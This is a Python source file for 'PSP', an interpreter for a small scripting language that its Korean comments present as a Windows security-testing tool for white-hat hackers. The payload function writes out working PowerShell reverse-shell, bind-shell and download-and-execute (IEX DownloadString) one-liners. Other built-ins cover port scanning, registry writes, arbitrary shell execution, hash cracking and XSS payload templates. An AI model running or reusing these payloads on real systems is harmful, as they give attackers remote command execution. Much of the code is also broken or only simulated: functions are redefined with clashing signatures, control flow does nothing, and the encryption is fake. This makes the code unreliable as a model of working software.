#!/usr/bin/env python3
"""
PSP (PowerShellPlus) Interpreter
화이트해커를 위한 Windows 보안 테스팅 언어

Author: PSP Development Team
License: MIT
"""

import re
import sys
import os
import subprocess
import socket
import struct
import hashlib
import base64
from typing import Dict, Any, List, Optional
import argparse

class PSPInterpreter:
    def __init__(self):
        self.variables = {}
        self.functions = {}
        self.builtin_functions = self._init_builtin_functions()
        
    def _init_builtin_functions(self):
        """내장 함수들 초기화"""
        return {
            # 네트워크 함수들
            'connect': self._connect,
            'send': self._send,
            'recv': self._recv,
            'scan_port': self._scan_port,
            'scan_range': self._scan_range,
            
            # 암호화/해시 함수들
            'md5': self._md5,
            'sha1': self._sha1,
            'sha256': self._sha256,
            'base64_encode': self._base64_encode,
            'base64_decode': self._base64_decode,
            
            # 페이로드/익스플로잇 함수들
            'create_payload': self._create_payload,
            'buffer_overflow': self._buffer_overflow,
            'shellcode': self._shellcode,
            
            # 윈도우 특화 함수들
            'enum_processes': self._enum_processes,
            'enum_services': self._enum_services,
            'registry_read': self._registry_read,
            'registry_write': self._registry_write,
            
            # 파일 시스템 함수들
            'file_read': self._file_read,
            'file_write': self._file_write,
            'file_exists': self._file_exists,
            'dir_list': self._dir_list,
            
            # 출력 함수들
            'print': self._print,
            'printf': self._printf,
            'log': self._log,
            
            # 시간/날짜 함수들
            'get_current_time': self._get_current_time,
            'sleep': self._sleep,
            
            # 유틸리티 함수들
            'array_to_string': self._array_to_string,
            'list_to_string': self._list_to_string,
            'dict_to_string': self._dict_to_string,
            'string_to_int': self._string_to_int,
            'random_int': self._random_int,
            'random_bool': self._random_bool,
            
            # 파일 시스템 함수들
            'file_exists': self._file_exists,
            'file_read': self._file_read,
            'file_write': self._file_write,
            'file_delete': self._file_delete,
            'file_get_size': self._file_get_size,
            'dir_exists': self._dir_exists,
            'dir_create': self._dir_create,
            'dir_delete': self._dir_delete,
            
            # 시스템 함수들
            'get_os_info': self._get_os_info,
            'get_current_user': self._get_current_user,
            'get_current_directory': self._get_current_directory,
            'get_env_var': self._get_env_var,
            'execute_command': self._execute_command,
            'get_memory_usage': self._get_memory_usage,
            
            # 네트워크 확장 함수들
            'ping': self._ping,
            'tcp_connect': self._tcp_connect,
            'tcp_banner_grab': self._tcp_banner_grab,
            'get_service_name': self._get_service_name,
            'http_get_headers': self._http_get_headers,
            'http_get_content': self._http_get_content,
            'http_get_status': self._http_get_status,
            'url_encode': self._url_encode,
            
            # 해시 크래킹 함수들
            'hash_md5': self._hash_md5,
            'hash_sha1': self._hash_sha1,
            'hash_sha256': self._hash_sha256,
            'crack_hash_md5': self._crack_hash_md5,
            'generate_combinations': self._generate_combinations,
            
            # 암호화 함수들
            'aes_encrypt': self._aes_encrypt,
            'aes_decrypt': self._aes_decrypt,
            'des_encrypt': self._des_encrypt,
            'des_decrypt': self._des_decrypt,
            'rsa_generate_keypair': self._rsa_generate_keypair,
            'rsa_encrypt': self._rsa_encrypt,
            'rsa_decrypt': self._rsa_decrypt,
            
            # 보안 테스트 함수들
            'port_scan': self._port_scan,
            'sql_injection_test': self._sql_injection_test,
            'xss_test': self._xss_test,
            'generate_xss_payload': self._generate_xss_payload,
        }
    
    def execute_file(self, filename: str):
        """PSP 파일 실행"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            self.execute(content)
        except FileNotFoundError:
            print(f"오류: 파일 '{filename}'을 찾을 수 없습니다.")
        except Exception as e:
            print(f"실행 오류: {e}")
    
    def execute(self, code: str):
        """PSP 코드 실행"""
        lines = code.split('\n')
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            if line and not line.startswith('#'):
                try:
                    i = self._execute_line(line, lines, i)
                except Exception as e:
                    print(f"라인 {i+1} 오류: {e}")
                    break
            i += 1
    
    def _execute_line(self, line: str, all_lines: List[str], current_index: int) -> int:
        """개별 라인 실행"""
        # 변수 할당
        if '=' in line and not any(op in line for op in ['==', '!=', '>=', '<=']):
            self._handle_assignment(line)
            return current_index + 1
        
        # 함수 호출
        if '(' in line and ')' in line:
            self._handle_function_call(line)
            return current_index + 1
        
        # 조건문
        if line.startswith('if '):
            return self._handle_if_statement(all_lines, current_index)
        
        # 반복문
        if line.startswith('for '):
            return self._handle_for_loop(all_lines, current_index)
        
        # while 루프
        if line.startswith('while '):
            return self._handle_while_loop(all_lines, current_index)
        
        return current_index + 1
    
    def _handle_assignment(self, line: str):
        """변수 할당 처리"""
        parts = line.split('=', 1)
        var_name = parts[0].strip()
        value = self._evaluate_expression(parts[1].strip())
        self.variables[var_name] = value
    
    def _handle_function_call(self, line: str):
        """함수 호출 처리"""
        # 함수 이름과 파라미터 파싱
        match = re.match(r'(\w+)\((.*)\)', line)
        if match:
            func_name = match.group(1)
            params_str = match.group(2)
            params = self._parse_parameters(params_str)
            
            if func_name in self.builtin_functions:
                return self.builtin_functions[func_name](params)
            else:
                raise Exception(f"알 수 없는 함수: {func_name}")
    
    def _parse_parameters(self, params_str: str) -> List[Any]:
        """파라미터 파싱"""
        if not params_str.strip():
            return []
        
        params = []
        for param in params_str.split(','):
            param = param.strip()
            params.append(self._evaluate_expression(param))
        return params
    
    def _evaluate_expression(self, expr: str) -> Any:
        """표현식 평가"""
        expr = expr.strip()
        
        # 문자열 리터럴
        if expr.startswith('"') and expr.endswith('"'):
            return expr[1:-1]
        
        # 숫자
        try:
            return int(expr)
        except ValueError:
            try:
                return float(expr)
            except ValueError:
                pass
        
        # 변수
        if expr in self.variables:
            return self.variables[expr]
        
        # 함수 호출
        if '(' in expr:
            return self._handle_function_call(expr)
        
        return expr
    
    # 내장 함수 구현들
    def _connect(self, host: str, port: int) -> bool:
        """TCP 연결"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def _send(self, host: str, port: int, data: str) -> bool:
        """데이터 전송"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.send(data.encode())
            sock.close()
            return True
        except Exception:
            return False
    
    def _recv(self, host: str, port: int, size: int = 1024) -> str:
        """데이터 수신"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            data = sock.recv(size)
            sock.close()
            return data.decode()
        except Exception:
            return ""
    
    def _scan_port(self, host: str, port: int) -> bool:
        """포트 스캔"""
        return self._connect(host, port)
    
    def _scan_range(self, host: str, start_port: int, end_port: int) -> List[int]:
        """포트 범위 스캔"""
        open_ports = []
        for port in range(start_port, end_port + 1):
            if self._scan_port(host, port):
                open_ports.append(port)
        return open_ports
    
    def _md5(self, data: str) -> str:
        """MD5 해시"""
        return hashlib.md5(data.encode()).hexdigest()
    
    def _sha1(self, data: str) -> str:
        """SHA1 해시"""
        return hashlib.sha1(data.encode()).hexdigest()
    
    def _sha256(self, data: str) -> str:
        """SHA256 해시"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def _base64_encode(self, data: str) -> str:
        """Base64 인코딩"""
        return base64.b64encode(data.encode()).decode()
    
    def _base64_decode(self, data: str) -> str:
        """Base64 디코딩"""
        return base64.b64decode(data.encode()).decode()
    
    def _create_payload(self, payload_type: str, target: str = "", options: str = "") -> str:
        """페이로드 생성"""
        payloads = {
            "reverse_shell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{target}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "bind_shell": "powershell -nop -c \"$listener = [System.Net.Sockets.TcpListener]4444; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"",
            "download_exec": f"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('{target}')\""
        }
        return payloads.get(payload_type, "")
    
    def _buffer_overflow(self, target_size: int, padding: str = "A") -> str:
        """버퍼 오버플로우 패턴 생성"""
        return padding * target_size
    
    def _shellcode(self, arch: str = "x64") -> str:
        """셸코드 생성"""
        if arch == "x64":
            return "\\x48\\x31\\xc0\\x48\\x31\\xdb\\x48\\x31\\xc9\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\xff\\xc0\\x48\\x89\\xc6"
        else:
            return "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x40\\x89\\xc7\\x40\\x40\\x40\\x89\\xc6"
    
    def _enum_processes(self) -> List[str]:
        """프로세스 열거"""
        try:
            result = subprocess.run(['tasklist'], capture_output=True, text=True, shell=True)
            return result.stdout.split('\n')
        except Exception:
            return []
    
    def _enum_services(self) -> List[str]:
        """서비스 열거"""
        try:
            result = subprocess.run(['sc', 'query'], capture_output=True, text=True, shell=True)
            return result.stdout.split('\n')
        except Exception:
            return []
    
    def _registry_read(self, key: str, value: str = "") -> str:
        """레지스트리 읽기"""
        try:
            cmd = f'reg query "{key}"'
            if value:
                cmd += f' /v "{value}"'
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            return result.stdout
        except Exception:
            return ""
    
    def _registry_write(self, key: str, value: str, data: str, reg_type: str = "REG_SZ") -> bool:
        """레지스트리 쓰기"""
        try:
            cmd = f'reg add "{key}" /v "{value}" /t {reg_type} /d "{data}" /f'
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            return result.returncode == 0
        except Exception:
            return False
    
    def _file_read(self, filepath: str) -> str:
        """파일 읽기"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception:
            return ""
    
    def _file_write(self, filepath: str, content: str) -> bool:
        """파일 쓰기"""
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            return True
        except Exception:
            return False
    
    def _file_exists(self, filepath: str) -> bool:
        """파일 존재 확인"""
        return os.path.exists(filepath)
    
    def _dir_list(self, dirpath: str = ".") -> List[str]:
        """디렉터리 목록"""
        try:
            return os.listdir(dirpath)
        except Exception:
            return []
    
    def _print(self, args) -> None:
        """출력"""
        if args:
            # 변수 이름을 실제 값으로 치환
            resolved_args = []
            for arg in args:
                if isinstance(arg, str) and arg in self.variables:
                    resolved_args.append(self.variables[arg])
                else:
                    resolved_args.append(arg)
            print(*resolved_args)
        else:
            print()
    
    def _printf(self, args) -> None:
        """포맷 출력"""
        if not args:
            return
        
        format_str = args[0]
        values = args[1:] if len(args) > 1 else []
        
        try:
            # 변수 이름을 실제 값으로 치환
            resolved_values = []
            for val in values:
                if isinstance(val, str) and val in self.variables:
                    resolved_values.append(self.variables[val])
                else:
                    resolved_values.append(val)
            
            # C 스타일 포맷팅을 Python으로 변환
            python_format = format_str.replace('%s', '{}').replace('%d', '{}').replace('%f', '{}').replace('%.2f', '{:.2f}').replace('\\n', '\n')
            print(python_format.format(*resolved_values))
        except Exception as e:
            # 포맷 변환 실패시 기본 출력
            print(args)
    
    def _log(self, message: str, level: str = "INFO") -> None:
        """로그 출력"""
        print(f"[{level}] {message}")
    
    # 제어 구조 처리
    def _handle_if_statement(self, lines: List[str], start_index: int) -> int:
        """if 문 처리"""
        # 간단한 if 구현 (실제로는 더 복잡한 파싱이 필요)
        return start_index + 1
    
    def _handle_for_loop(self, lines: List[str], start_index: int) -> int:
        """for 루프 처리"""
        # 간단한 for 구현
        return start_index + 1
    
    def _handle_while_loop(self, lines: List[str], start_index: int) -> int:
        """while 루프 처리"""
        # 간단한 while 구현
        return start_index + 1
    
    # 시간/날짜 함수들
    def _get_current_time(self, args):
        """현재 시간 반환"""
        import datetime
        return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def _sleep(self, args):
        """지정된 시간(ms) 동안 대기"""
        import time
        if args:
            ms = int(args[0])
            time.sleep(ms / 1000.0)
        return None
    
    # 유틸리티 함수들
    def _array_to_string(self, args):
        """배열을 문자열로 변환"""
        if args and isinstance(args[0], list):
            return str(args[0])
        return "[]"
    
    def _list_to_string(self, args):
        """리스트를 문자열로 변환"""
        if args and isinstance(args[0], list):
            return ', '.join(str(x) for x in args[0])
        return ""
    
    def _dict_to_string(self, args):
        """딕셔너리를 문자열로 변환"""
        if args and isinstance(args[0], dict):
            return str(args[0])
        return "{}"
    
    def _string_to_int(self, args):
        """문자열을 정수로 변환"""
        if args:
            try:
                return int(args[0])
            except:
                return 0
        return 0
    
    def _random_int(self, args):
        """랜덤 정수 생성"""
        import random
        if len(args) >= 2:
            return random.randint(int(args[0]), int(args[1]))
        return random.randint(0, 100)
    
    def _random_bool(self, args):
        """랜덤 불린 값 생성"""
        import random
        return random.choice([True, False])
    
    # 파일 시스템 함수들
    def _file_exists(self, args):
        """파일 존재 여부 확인"""
        if args:
            return os.path.exists(args[0])
        return False
    
    def _file_read(self, args):
        """파일 읽기"""
        if args and os.path.exists(args[0]):
            try:
                with open(args[0], 'r', encoding='utf-8') as f:
                    return f.read()
            except:
                return ""
        return ""
    
    def _file_write(self, args):
        """파일 쓰기"""
        if len(args) >= 2:
            try:
                with open(args[0], 'w', encoding='utf-8') as f:
                    f.write(str(args[1]))
                return True
            except:
                return False
        return False
    
    def _file_delete(self, args):
        """파일 삭제"""
        if args and os.path.exists(args[0]):
            try:
                os.remove(args[0])
                return True
            except:
                return False
        return False
    
    def _file_get_size(self, args):
        """파일 크기 반환"""
        if args and os.path.exists(args[0]):
            try:
                return os.path.getsize(args[0])
            except:
                return 0
        return 0
    
    def _dir_exists(self, args):
        """디렉토리 존재 여부 확인"""
        if args:
            return os.path.isdir(args[0])
        return False
    
    def _dir_create(self, args):
        """디렉토리 생성"""
        if args:
            try:
                os.makedirs(args[0], exist_ok=True)
                return True
            except:
                return False
        return False
    
    def _dir_delete(self, args):
        """디렉토리 삭제"""
        if args and os.path.exists(args[0]):
            try:
                import shutil
                shutil.rmtree(args[0])
                return True
            except:
                return False
        return False
    
    # 시스템 함수들
    def _get_os_info(self, args):
        """운영체제 정보 반환"""
        import platform
        return f"{platform.system()} {platform.release()}"
    
    def _get_current_user(self, args):
        """현재 사용자명 반환"""
        import getpass
        return getpass.getuser()
    
    def _get_current_directory(self, args):
        """현재 작업 디렉토리 반환"""
        return os.getcwd()
    
    def _get_env_var(self, args):
        """환경변수 값 반환"""
        if args:
            return os.environ.get(args[0], "")
        return ""
    
    def _execute_command(self, args):
        """시스템 명령 실행"""
        if args:
            try:
                result = subprocess.run(args[0], shell=True, capture_output=True, text=True)
                return result.stdout.strip()
            except:
                return ""
        return ""
    
    def _get_memory_usage(self, args):
        """메모리 사용량 반환 (KB 단위)"""
        try:
            import psutil
            return psutil.virtual_memory().used // 1024
        except:
            return 0
    
    # 네트워크 확장 함수들
    def _ping(self, args):
        """ICMP 핑 테스트"""
        if args:
            host = args[0]
            count = int(args[1]) if len(args) > 1 else 1
            try:
                cmd = f"ping -c {count} {host}" if os.name != 'nt' else f"ping -n {count} {host}"
                result = subprocess.run(cmd, shell=True, capture_output=True)
                return result.returncode == 0
            except:
                return False
        return False
    
    def _tcp_connect(self, args):
        """TCP 연결 테스트"""
        if len(args) >= 2:
            host = args[0]
            port = int(args[1])
            timeout = int(args[2]) if len(args) > 2 else 3
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                sock.close()
                return result == 0
            except:
                return False
        return False
    
    def _tcp_banner_grab(self, args):
        """TCP 배너 그래빙"""
        if len(args) >= 2:
            host = args[0]
            port = int(args[1])
            timeout = int(args[2]) if len(args) > 2 else 5
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                sock.close()
                return banner
            except:
                return ""
        return ""
    
    def _get_service_name(self, args):
        """포트 번호로 서비스 이름 반환"""
        if args:
            port = int(args[0])
            services = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
                995: "POP3S", 3389: "RDP", 5432: "PostgreSQL", 3306: "MySQL"
            }
            return services.get(port, "Unknown")
        return "Unknown"
    
    def _http_get_headers(self, args):
        """HTTP 헤더 가져오기"""
        if args:
            try:
                import urllib.request
                req = urllib.request.Request(args[0])
                response = urllib.request.urlopen(req, timeout=10)
                return dict(response.headers)
            except:
                return {}
        return {}
    
    def _http_get_content(self, args):
        """HTTP 컨텐츠 가져오기"""
        if args:
            try:
                import urllib.request
                response = urllib.request.urlopen(args[0], timeout=10)
                return response.read().decode('utf-8', errors='ignore')
            except:
                return ""
        return ""
    
    def _http_get_status(self, args):
        """HTTP 상태 코드 가져오기"""
        if args:
            try:
                import urllib.request
                response = urllib.request.urlopen(args[0], timeout=10)
                return response.getcode()
            except Exception as e:
                if hasattr(e, 'code'):
                    return e.code
                return 0
        return 0
    
    def _url_encode(self, args):
        """URL 인코딩"""
        if args:
            try:
                import urllib.parse
                return urllib.parse.quote(args[0])
            except:
                return args[0]
        return ""
    
    # 해시 함수들
    def _hash_md5(self, args):
        """MD5 해시 생성"""
        if args:
            return hashlib.md5(str(args[0]).encode()).hexdigest()
        return ""
    
    def _hash_sha1(self, args):
        """SHA1 해시 생성"""
        if args:
            return hashlib.sha1(str(args[0]).encode()).hexdigest()
        return ""
    
    def _hash_sha256(self, args):
        """SHA256 해시 생성"""
        if args:
            return hashlib.sha256(str(args[0]).encode()).hexdigest()
        return ""
    
    def _crack_hash_md5(self, args):
        """MD5 해시 크래킹 시뮬레이션"""
        if len(args) >= 2:
            hash_value = args[0]
            wordlist = args[1] if isinstance(args[1], list) else ["password", "123456", "admin", "test"]
            for word in wordlist:
                if hashlib.md5(word.encode()).hexdigest() == hash_value:
                    return word
        return ""
    
    def _generate_combinations(self, args):
        """문자 조합 생성 (브루트포스용)"""
        if len(args) >= 3:
            charset = args[0]
            length = int(args[1])
            max_count = int(args[2])
            
            import itertools
            combinations = []
            for combo in itertools.product(charset, repeat=length):
                combinations.append(''.join(combo))
                if len(combinations) >= max_count:
                    break
            return combinations
        return []
    
    # 암호화 함수들 (시뮬레이션)
    def _aes_encrypt(self, args):
        """AES 암호화 시뮬레이션"""
        if len(args) >= 2:
            return f"AES_ENCRYPTED[{args[0]}]"
        return ""
    
    def _aes_decrypt(self, args):
        """AES 복호화 시뮬레이션"""
        if args:
            encrypted = args[0]
            if encrypted.startswith("AES_ENCRYPTED[") and encrypted.endswith("]"):
                return encrypted[14:-1]
        return ""
    
    def _des_encrypt(self, args):
        """DES 암호화 시뮬레이션"""
        if len(args) >= 2:
            return f"DES_ENCRYPTED[{args[0]}]"
        return ""
    
    def _des_decrypt(self, args):
        """DES 복호화 시뮬레이션"""
        if args:
            encrypted = args[0]
            if encrypted.startswith("DES_ENCRYPTED[") and encrypted.endswith("]"):
                return encrypted[14:-1]
        return ""
    
    def _rsa_generate_keypair(self, args):
        """RSA 키 쌍 생성 시뮬레이션"""
        return {
            "public": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...",
            "private": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC..."
        }
    
    def _rsa_encrypt(self, args):
        """RSA 암호화 시뮬레이션"""
        if len(args) >= 2:
            return f"RSA_ENCRYPTED[{args[0]}]"
        return ""
    
    def _rsa_decrypt(self, args):
        """RSA 복호화 시뮬레이션"""
        if args:
            encrypted = args[0]
            if encrypted.startswith("RSA_ENCRYPTED[") and encrypted.endswith("]"):
                return encrypted[14:-1]
        return ""
    
    # 보안 테스트 함수들
    def _port_scan(self, args):
        """포트 스캔"""
        if len(args) >= 2:
            host = args[0]
            ports = args[1] if isinstance(args[1], list) else [80, 443, 22]
            results = {}
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    if result == 0:
                        results[port] = self._get_service_name([port])
                except:
                    pass
            return results
        return {}
    
    def _sql_injection_test(self, args):
        """SQL 인젝션 테스트 시뮬레이션"""
        if len(args) >= 3:
            url = args[0]
            param = args[1]
            payload = args[2]
            print(f"SQL 인젝션 테스트: {url}?{param}={payload}")
            return True
        return False
    
    def _xss_test(self, args):
        """XSS 테스트 시뮬레이션"""
        if len(args) >= 3:
            url = args[0]
            param = args[1]
            payload = args[2]
            print(f"XSS 테스트: {url}?{param}={payload}")
            return True
        return False
    
    def _generate_xss_payload(self, args):
        """XSS 페이로드 생성"""
        if len(args) >= 2:
            action = args[0]
            message = args[1]
            return f"<script>{action}('{message}')</script>"
        return "<script>alert('XSS')</script>"
    
def main():
    parser = argparse.ArgumentParser(description='PSP (PowerShellPlus) Interpreter')
    parser.add_argument('file', nargs='?', help='실행할 PSP 파일')
    parser.add_argument('-i', '--interactive', action='store_true', help='대화형 모드')
    
    args = parser.parse_args()
    
    interpreter = PSPInterpreter()
    
    if args.file:
        interpreter.execute_file(args.file)
    elif args.interactive:
        print("PSP (PowerShellPlus) Interactive Mode")
        print("종료하려면 'exit' 또는 Ctrl+C를 입력하세요.")
        
        while True:
            try:
                line = input("PSP> ")
                if line.strip() == 'exit':
                    break
                interpreter.execute(line)
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"오류: {e}")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
